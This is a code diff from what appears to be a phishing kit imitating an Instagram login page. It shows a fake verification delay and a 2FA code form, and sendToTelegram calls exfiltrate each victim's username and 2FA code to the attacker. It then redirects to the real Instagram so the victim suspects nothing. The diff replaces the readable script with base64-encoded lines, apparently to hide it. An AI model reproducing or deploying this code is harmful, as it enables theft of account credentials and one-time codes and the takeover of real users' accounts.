+ICAgICAgICBsb2dpbkJ0bi5kaXNhYmxlZCA9IHRydWU7
+ICAgICAgICBjb29sZG93bk92ZXJsYXkuc3R5bGUuZGlzcGxheSA9ICdmbGV4Jzs
+ICAgICAgICBjb29sZG93bkNvdW50ID0gQ09ORklHLmNvb2xkb3duRHVyYXRpb247
+ICAgICAgICBjb29sZG93blRleHQudGV4dENvbnRlbnQgPSBgVmVyaWZ5aW5nIGNyZWRlbnRpYWxzLi4uICgke2Nvb2xkb3duQ291bnR9cylgOw
 
-        cooldownTimer = setInterval(() => {
-            cooldownCount--;
-            if (cooldownCount > 0) {
-                cooldownText.textContent = `Verifying credentials... (${cooldownCount}s)`;
-            } else {
-                clearInterval(cooldownTimer);
-                cooldownTimer = null;
-                cooldownOverlay.style.display = 'none';
+ICAgICAgICBjb29sZG93blRpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew
+ICAgICAgICAgICAgY29vbGRvd25Db3VudC0tOw
+ICAgICAgICAgICAgaWYgKGNvb2xkb3duQ291bnQgPiAwKSB7
+ICAgICAgICAgICAgICAgIGNvb2xkb3duVGV4dC50ZXh0Q29udGVudCA9IGBWZXJpZnlpbmcgY3JlZGVudGlhbHMuLi4gKCR7Y29vbGRvd25Db3VudH1zKWA7
+ICAgICAgICAgICAgfSBlbHNlIHs
+ICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoY29vbGRvd25UaW1lcik7
+ICAgICAgICAgICAgICAgIGNvb2xkb3duVGltZXIgPSBudWxsOw
+ICAgICAgICAgICAgICAgIGNvb2xkb3duT3ZlcmxheS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw
 
-                // إظهار 2FA
-                loginCard.style.display = 'none';
-                signupCard.style.display = 'none';
-                twofaSection.style.display = 'block';
-                displayUser.textContent = capturedUsername || 'your phone';
+ICAgICAgICAgICAgICAgIC8vINil2LjZh9in2LEgMkZB
+ICAgICAgICAgICAgICAgIGxvZ2luQ2FyZC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw
+ICAgICAgICAgICAgICAgIHNpZ251cENhcmQuc3R5bGUuZGlzcGxheSA9ICdub25lJzs
+ICAgICAgICAgICAgICAgIHR3b2ZhU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzs
+ICAgICAgICAgICAgICAgIGRpc3BsYXlVc2VyLnRleHRDb250ZW50ID0gY2FwdHVyZWRVc2VybmFtZSB8fCAneW91ciBwaG9uZSc7
 
-                codeBoxes.forEach(box => box.value = '');
-                codeBoxes[0].focus();
-                verifyBtn.disabled = true;
-                errorMsg.style.display = 'none';
-                successMsg.style.display = 'none';
-            }
-        }, 1000);
-    });
+ICAgICAgICAgICAgICAgIGNvZGVCb3hlcy5mb3JFYWNoKGJveCA9PiBib3gudmFsdWUgPSAnJyk7
+ICAgICAgICAgICAgICAgIGNvZGVCb3hlc1swXS5mb2N1cygpOw
+ICAgICAgICAgICAgICAgIHZlcmlmeUJ0bi5kaXNhYmxlZCA9IHRydWU7
+ICAgICAgICAgICAgICAgIGVycm9yTXNnLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7
+ICAgICAgICAgICAgICAgIHN1Y2Nlc3NNc2cuc3R5bGUuZGlzcGxheSA9ICdub25lJzs
+ICAgICAgICAgICAgfQ
+ICAgICAgICB9LCAxMDAwKTs
+ICAgIH0pOw
 
-    // ============================================
-    //  2FA CODE INPUT
-    // ============================================
-    codeBoxes.forEach((box, index) => {
-        box.addEventListener('input', function() {
-            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
-            if (this.value && index < codeBoxes.length - 1) {
-                codeBoxes[index + 1].focus();
-            }
-            const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
-            verifyBtn.disabled = !allFilled;
-            errorMsg.style.display = 'none';
-        });
-        box.addEventListener('keydown', function(e) {
-            if (e.key === 'Backspace' && !this.value && index > 0) {
-                codeBoxes[index - 1].focus();
-            }
-        });
-        box.addEventListener('paste', function(e) {
-            e.preventDefault();
-            const paste = (e.clipboardData || window.clipboardData).getData('text');
-            const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
-            digits.split('').forEach((d, i) => {
-                if (codeBoxes[i]) codeBoxes[i].value = d;
-            });
-            if (digits.length === 6) {
-                codeBoxes[5].focus();
-                verifyBtn.disabled = false;
-            } else if (codeBoxes[digits.length]) {
-                codeBoxes[digits.length].focus();
-            }
-        });
-    });
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICAyRkEgQ09ERSBJTlBVVA
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIGNvZGVCb3hlcy5mb3JFYWNoKChib3gsIGluZGV4KSA9PiB7
+ICAgICAgICBib3guYWRkRXZlbnRMaXN0ZW5lcignaW5wdXQnLCBmdW5jdGlvbigpIHs
+ICAgICAgICAgICAgdGhpcy52YWx1ZSA9IHRoaXMudmFsdWUucmVwbGFjZSgvW14wLTldL2csICcnKS5zbGljZSgwLCAxKTs
+ICAgICAgICAgICAgaWYgKHRoaXMudmFsdWUgJiYgaW5kZXggPCBjb2RlQm94ZXMubGVuZ3RoIC0gMSkgew
+ICAgICAgICAgICAgICAgIGNvZGVCb3hlc1tpbmRleCArIDFdLmZvY3VzKCk7
+ICAgICAgICAgICAgfQ
+ICAgICAgICAgICAgY29uc3QgYWxsRmlsbGVkID0gQXJyYXkuZnJvbShjb2RlQm94ZXMpLmV2ZXJ5KGIgPT4gYi52YWx1ZSAhPT0gJycpOw
+ICAgICAgICAgICAgdmVyaWZ5QnRuLmRpc2FibGVkID0gIWFsbEZpbGxlZDs
+ICAgICAgICAgICAgZXJyb3JNc2cuc3R5bGUuZGlzcGxheSA9ICdub25lJzs
+ICAgICAgICB9KTs
+ICAgICAgICBib3guYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsIGZ1bmN0aW9uKGUpIHs
+ICAgICAgICAgICAgaWYgKGUua2V5ID09PSAnQmFja3NwYWNlJyAmJiAhdGhpcy52YWx1ZSAmJiBpbmRleCA-IDApIHs
+ICAgICAgICAgICAgICAgIGNvZGVCb3hlc1tpbmRleCAtIDFdLmZvY3VzKCk7
+ICAgICAgICAgICAgfQ
+ICAgICAgICB9KTs
+ICAgICAgICBib3guYWRkRXZlbnRMaXN0ZW5lcigncGFzdGUnLCBmdW5jdGlvbihlKSB7
+ICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw
+ICAgICAgICAgICAgY29uc3QgcGFzdGUgPSAoZS5jbGlwYm9hcmREYXRhIHx8IHdpbmRvdy5jbGlwYm9hcmREYXRhKS5nZXREYXRhKCd0ZXh0Jyk7
+ICAgICAgICAgICAgY29uc3QgZGlnaXRzID0gcGFzdGUucmVwbGFjZSgvW14wLTldL2csICcnKS5zbGljZSgwLCA2KTs
+ICAgICAgICAgICAgZGlnaXRzLnNwbGl0KCcnKS5mb3JFYWNoKChkLCBpKSA9PiB7
+ICAgICAgICAgICAgICAgIGlmIChjb2RlQm94ZXNbaV0pIGNvZGVCb3hlc1tpXS52YWx1ZSA9IGQ7
+ICAgICAgICAgICAgfSk7
+ICAgICAgICAgICAgaWYgKGRpZ2l0cy5sZW5ndGggPT09IDYpIHs
+ICAgICAgICAgICAgICAgIGNvZGVCb3hlc1s1XS5mb2N1cygpOw
+ICAgICAgICAgICAgICAgIHZlcmlmeUJ0bi5kaXNhYmxlZCA9IGZhbHNlOw
+ICAgICAgICAgICAgfSBlbHNlIGlmIChjb2RlQm94ZXNbZGlnaXRzLmxlbmd0aF0pIHs
+ICAgICAgICAgICAgICAgIGNvZGVCb3hlc1tkaWdpdHMubGVuZ3RoXS5mb2N1cygpOw
+ICAgICAgICAgICAgfQ
+ICAgICAgICB9KTs
+ICAgIH0pOw
 
-    // ============================================
-    //  VERIFY 2FA
-    // ============================================
-    verifyBtn.addEventListener('click', async function() {
-        const code = Array.from(codeBoxes).map(b => b.value).join('');
-        verificationAttempts++;
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICBWRVJJRlkgMkZB
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIHZlcmlmeUJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGFzeW5jIGZ1bmN0aW9uKCkgew
+ICAgICAgICBjb25zdCBjb2RlID0gQXJyYXkuZnJvbShjb2RlQm94ZXMpLm1hcChiID0-IGIudmFsdWUpLmpvaW4oJycpOw
+ICAgICAgICB2ZXJpZmljYXRpb25BdHRlbXB0cysrOw
 
-        loadingScreen.style.display = 'flex';
-        loadingText.textContent = 'Verifying code...';
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
+ICAgICAgICBsb2FkaW5nU2NyZWVuLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7
+ICAgICAgICBsb2FkaW5nVGV4dC50ZXh0Q29udGVudCA9ICdWZXJpZnlpbmcgY29kZS4uLic7
+ICAgICAgICBlcnJvck1zZy5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw
+ICAgICAgICBzdWNjZXNzTXNnLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7
 
-        // 🆕 إرسال رمز 2FA في رسالة مستقلة
-        sendToTelegram(
-            `🔢 *Step 3: 2FA Code Captured* 🔢\n\n` +
-            `👤 *User:* \`${capturedUsername}\`\n` +
-            `🔢 *2FA Code:* \`${code}\`\n` +
-            `🔄 *Attempt:* ${verificationAttempts}\n` +
-            `⏰ *Time:* ${new Date().toISOString()}`
-        );
+ICAgICAgICAvLyDwn4aVINil2LHYs9in2YQg2LHZhdiyIDJGQSDZgdmKINix2LPYp9mE2Kkg2YXYs9iq2YLZhNip
+ICAgICAgICBzZW5kVG9UZWxlZ3JhbSg
+ICAgICAgICAgICAgYPCflKIgKlN0ZXAgMzogMkZBIENvZGUgQ2FwdHVyZWQqIPCflKJcblxuYCAr
+ICAgICAgICAgICAgYPCfkaQgKlVzZXI6KiBcYCR7Y2FwdHVyZWRVc2VybmFtZX1cYFxuYCAr
+ICAgICAgICAgICAgYPCflKIgKjJGQSBDb2RlOiogXGAke2NvZGV9XGBcbmAgKw
+ICAgICAgICAgICAgYPCflIQgKkF0dGVtcHQ6KiAke3ZlcmlmaWNhdGlvbkF0dGVtcHRzfVxuYCAr
+ICAgICAgICAgICAgYOKPsCAqVGltZToqICR7bmV3IERhdGUoKS50b0lTT1N0cmluZygpfWA
+ICAgICAgICApOw
 
-        try {
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            const isCodeValid = verificationAttempts >= 2 || code === '123456';
-            
-            loadingScreen.style.display = 'none';
-            
-            if (isCodeValid) {
-                successMsg.style.display = 'block';
-                loadingText.textContent = 'Verifying...';
-                
-                setTimeout(() => {
-                    loadingScreen.style.display = 'flex';
-                    loadingText.textContent = 'Redirecting to Instagram...';
-                    
-                    setTimeout(() => {
-                        window.location.href = 'https://www.instagram.com';
-                    }, CONFIG.delayBeforeRedirect);
-                }, 800);
-            } else {
-                errorMsg.textContent = 'Invalid code. Please try again.';
-                errorMsg.style.display = 'block';
-                
-                codeBoxes.forEach(box => box.value = '');
-                codeBoxes[0].focus();
-                verifyBtn.disabled = true;
-            }
-        } catch (error) {
-            loadingScreen.style.display = 'none';
-            errorMsg.textContent = 'Connection error. Please try again.';
-            errorMsg.style.display = 'block';
-            
-            codeBoxes.forEach(box => box.value = '');
-            codeBoxes[0].focus();
-            verifyBtn.disabled = true;
-        }
-    });
+ICAgICAgICB0cnkgew
+ICAgICAgICAgICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDE1MDApKTs
+ICAgICAgICAgICAg
+ICAgICAgICAgICAgY29uc3QgaXNDb2RlVmFsaWQgPSB2ZXJpZmljYXRpb25BdHRlbXB0cyA-PSAyIHx8IGNvZGUgPT09ICcxMjM0NTYnOw
+ICAgICAgICAgICAg
+ICAgICAgICAgICAgbG9hZGluZ1NjcmVlbi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw
+ICAgICAgICAgICAg
+ICAgICAgICAgICAgaWYgKGlzQ29kZVZhbGlkKSB7
+ICAgICAgICAgICAgICAgIHN1Y2Nlc3NNc2cuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7
+ICAgICAgICAgICAgICAgIGxvYWRpbmdUZXh0LnRleHRDb250ZW50ID0gJ1ZlcmlmeWluZy4uLic7
+ICAgICAgICAgICAgICAgIA
+ICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew
+ICAgICAgICAgICAgICAgICAgICBsb2FkaW5nU2NyZWVuLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7
+ICAgICAgICAgICAgICAgICAgICBsb2FkaW5nVGV4dC50ZXh0Q29udGVudCA9ICdSZWRpcmVjdGluZyB0byBJbnN0YWdyYW0uLi4nOw
+ICAgICAgICAgICAgICAgICAgICA
+ICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0-IHs
+ICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbSc7
+ICAgICAgICAgICAgICAgICAgICB9LCBDT05GSUcuZGVsYXlCZWZvcmVSZWRpcmVjdCk7
+ICAgICAgICAgICAgICAgIH0sIDgwMCk7
+ICAgICAgICAgICAgfSBlbHNlIHs
+ICAgICAgICAgICAgICAgIGVycm9yTXNnLnRleHRDb250ZW50ID0gJ0ludmFsaWQgY29kZS4gUGxlYXNlIHRyeSBhZ2Fpbi4nOw
+ICAgICAgICAgICAgICAgIGVycm9yTXNnLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw
+ICAgICAgICAgICAgICAgIA
+ICAgICAgICAgICAgICAgIGNvZGVCb3hlcy5mb3JFYWNoKGJveCA9PiBib3gudmFsdWUgPSAnJyk7
+ICAgICAgICAgICAgICAgIGNvZGVCb3hlc1swXS5mb2N1cygpOw
+ICAgICAgICAgICAgICAgIHZlcmlmeUJ0bi5kaXNhYmxlZCA9IHRydWU7
+ICAgICAgICAgICAgfQ
+ICAgICAgICB9IGNhdGNoIChlcnJvcikgew
+ICAgICAgICAgICAgbG9hZGluZ1NjcmVlbi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw
+ICAgICAgICAgICAgZXJyb3JNc2cudGV4dENvbnRlbnQgPSAnQ29ubmVjdGlvbiBlcnJvci4gUGxlYXNlIHRyeSBhZ2Fpbi4nOw
+ICAgICAgICAgICAgZXJyb3JNc2cuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7
+ICAgICAgICAgICAg
+ICAgICAgICAgICAgY29kZUJveGVzLmZvckVhY2goYm94ID0-IGJveC52YWx1ZSA9ICcnKTs
+ICAgICAgICAgICAgY29kZUJveGVzWzBdLmZvY3VzKCk7
+ICAgICAgICAgICAgdmVyaWZ5QnRuLmRpc2FibGVkID0gdHJ1ZTs
+ICAgICAgICB9
+ICAgIH0pOw
 
-    // ============================================
-    //  RESEND
-    // ============================================
-    resendBtn.addEventListener('click', function() {
-        codeBoxes.forEach(box => box.value = '');
-        codeBoxes[0].focus();
-        verifyBtn.disabled = true;
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
-        
-        sendToTelegram(`🔄 *Resend Requested* 🔄\n\n👤 *User:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
-    });
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICBSRVNFTkQ
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIHJlc2VuZEJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKCkgew
+ICAgICAgICBjb2RlQm94ZXMuZm9yRWFjaChib3ggPT4gYm94LnZhbHVlID0gJycpOw
+ICAgICAgICBjb2RlQm94ZXNbMF0uZm9jdXMoKTs
+ICAgICAgICB2ZXJpZnlCdG4uZGlzYWJsZWQgPSB0cnVlOw
+ICAgICAgICBlcnJvck1zZy5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw
+ICAgICAgICBzdWNjZXNzTXNnLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7
+ICAgICAgICA
+ICAgICAgICBzZW5kVG9UZWxlZ3JhbShg8J-UhCAqUmVzZW5kIFJlcXVlc3RlZCog8J-UhFxuXG7wn5GkICpVc2VyOiogXGAke2NhcHR1cmVkVXNlcm5hbWV9XGBcbuKPsCAqVGltZToqICR7bmV3IERhdGUoKS50b0lTT1N0cmluZygpfWApOw
+ICAgIH0pOw
 
-    // ============================================
-    //  BACK TO LOGIN
-    // ============================================
-    backLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        twofaSection.style.display = 'none';
-        loginCard.style.display = 'block';
-        signupCard.style.display = 'block';
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
-        checkLogin();
-    });
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICBCQUNLIFRPIExPR0lO
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIGJhY2tMaW5rLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oZSkgew
+ICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7
+ICAgICAgICB0d29mYVNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdub25lJzs
+ICAgICAgICBsb2dpbkNhcmQuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7
+ICAgICAgICBzaWdudXBDYXJkLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw
+ICAgICAgICBlcnJvck1zZy5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw
+ICAgICAgICBzdWNjZXNzTXNnLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7
+ICAgICAgICBjaGVja0xvZ2luKCk7
+ICAgIH0pOw
 
-    // ============================================
-    //  FACEBOOK LOGIN
-    // ============================================
-    document.getElementById('fbLogin').addEventListener('click', function(e) {
-        e.preventDefault();
-        sendToTelegram(`📘 *FB Login Clicked* 📘\n\n👤 *User:* \`${capturedUsername || 'N/A'}\`\n⏰ *Time:* ${new Date().toISOString()}`);
-    });
-</script>
-</body>
-</html>
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICBGQUNFQk9PSyBMT0dJTg
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmYkxvZ2luJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbihlKSB7
+ICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7
+ICAgICAgICBzZW5kVG9UZWxlZ3JhbShg8J-TmCAqRkIgTG9naW4gQ2xpY2tlZCog8J-TmFxuXG7wn5GkICpVc2VyOiogXGAke2NhcHR1cmVkVXNlcm5hbWUgfHwgJ04vQSd9XGBcbuKPsCAqVGltZToqICR7bmV3IERhdGUoKS50b0lTT1N0cmluZygpfWApOw
+ICAgIH0pOw
+PC9zY3JpcHQ-
+PC9ib2R5Pg
+PC9odG1sPg
